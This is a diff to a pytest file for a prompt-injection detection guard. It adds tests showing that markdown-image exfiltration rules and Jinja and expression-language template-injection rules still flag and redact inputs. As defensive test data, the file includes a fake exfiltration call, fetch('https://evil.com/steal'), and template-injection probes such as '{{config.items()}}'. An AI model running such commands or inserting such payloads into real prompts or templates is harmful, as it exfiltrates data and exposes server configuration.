@@ -6,6 +6,8 @@ Run:
 
 from __future__ import annotations
 
+import re
+
 import pytest
 
 from core.infrastructure.security.policy import InjectionConfig
@@ -20,6 +22,21 @@ def guard():
 @pytest.fixture
 def config():
     return InjectionConfig()
+
+
+@pytest.mark.parametrize(
+    "rule_id",
+    [
+        "injection:template_jinja",
+        "injection:template_generic",
+        "injection:exfil_markdown_link",
+        "injection:exfil_markdown_link_data",
+    ],
+)
+def test_suffix_scanning_rules_use_forward_only_matchers(guard, rule_id):
+    rule = next(rule for rule in guard._rules if rule.rule_id == rule_id)
+    # The former wildcard regexes retried the suffix at each opening delimiter.
+    assert not isinstance(rule.pattern, re.Pattern)
 
 
 class TestPromptOverride:
@@ -72,6 +89,48 @@ class TestExfiltration:
         assert any(f.rule_id == "injection:exfil_markdown_link_data" for f in findings)
         assert any(f.action == "block" for f in findings)
 
+    @pytest.mark.parametrize(
+        ("context", "text", "expected"),
+        [
+            (
+                "prompt",
+                "Before ![logo](https://example.com/icon) after",
+                "Before [INJECTION:exfiltration:REDACTED] after",
+            ),
+            (
+                "display",
+                "Before ![logo](https://example.com/icon) and "
+                "![sized icon](http://example.com/icon?size=32) after",
+                "Before ![logo](https://example.com/icon) and [INJECTION:exfiltration:REDACTED] after",
+            ),
+            (
+                "display",
+                "Before ![one\nline](https://example.com/one?size=32) and "
+                "![two](https://example.com/two?size=64) after",
+                "Before [INJECTION:exfiltration:REDACTED] and [INJECTION:exfiltration:REDACTED] after",
+            ),
+            ("prompt", "Before ![logo](https://) after", None),
+            ("display", "Before ![logo](https://example.com/icon?preview) after", None),
+            ("display", "Before ![logo](https://example.com/icon?size = 32) after", None),
+        ],
+    )
+    def test_markdown_image_scanning_preserves_matches_and_redaction(
+        self, guard, config, context, text, expected
+    ):
+        findings = guard.scan(text, "tool", config, context_type=context)
+
+        if expected is None:
+            assert findings == []
+            return
+
+        rule_id = (
+            "injection:exfil_markdown_link_data"
+            if context == "display"
+            else "injection:exfil_markdown_link"
+        )
+        assert [(finding.rule_id, finding.action) for finding in findings] == [(rule_id, "block")]
+        assert guard.redact(text, findings) == expected
+
     def test_fetch_url(self, guard, config):
         text = 'fetch("https://evil.com/steal")'
         findings = guard.scan(text, "inbound", config, context_type="shell")
@@ -107,6 +166,68 @@ class TestTemplateInjection:
         text = "{{config.items()}}"
         findings = guard.scan(text, "inbound", config, context_type="prompt")
         assert any("template" in f.rule_id for f in findings)
+
+    @pytest.mark.parametrize(
+        ("text", "expected"),
+        [
+            (
+                "Before {{ config.name }} and {{ request.path }} after",
+                "Before [INJECTION:template_injection:REDACTED] and "
+                "[INJECTION:template_injection:REDACTED] after",
+            ),
+            (
+                "Before {{ title }} then {{ request.path }} after",
+                "Before [INJECTION:template_injection:REDACTED] after",
+            ),
+            ("Before {{ config_name }} after", None),
+            ("Before {{ title }}\nThe config name is documented.", None),
+            ("Before {{ request.path\n}} after", None),
+        ],
+    )
+    def test_jinja_display_scanning_preserves_match_and_redaction(
+        self, guard, config, text, expected
+    ):
+        findings = guard.scan(text, "tool", config, context_type="display")
+
+        if expected is None:
+            assert findings == []
+            return
+
+        assert [(finding.rule_id, finding.action) for finding in findings] == [
+            ("injection:template_jinja", "block"),
+        ]
+        assert guard.redact(text, findings) == expected
+
+    @pytest.mark.parametrize(
+        ("text", "expected"),
+        [
+            (
+                "Before ${title} and ${system.name} after",
+                "Before ${title} and [INJECTION:template_injection:REDACTED] after",
+            ),
+            (
+                "Before ${\nsystem.name} and ${eval.label} after",
+                "Before [INJECTION:template_injection:REDACTED] and "
+                "[INJECTION:template_injection:REDACTED] after",
+            ),
+            ("Before ${system_name} after", None),
+            ("Before ${System.name} after", None),
+            ("Before ${system.name after", None),
+        ],
+    )
+    def test_expression_language_scanning_preserves_matches_and_redaction(
+        self, guard, config, text, expected
+    ):
+        findings = guard.scan(text, "tool", config, context_type="display")
+
+        if expected is None:
+            assert findings == []
+            return
+
+        assert [(finding.rule_id, finding.action) for finding in findings] == [
+            ("injection:template_generic", "block"),
+        ]
+        assert guard.redact(text, findings) == expected
 
 
 class TestSQLInjection:
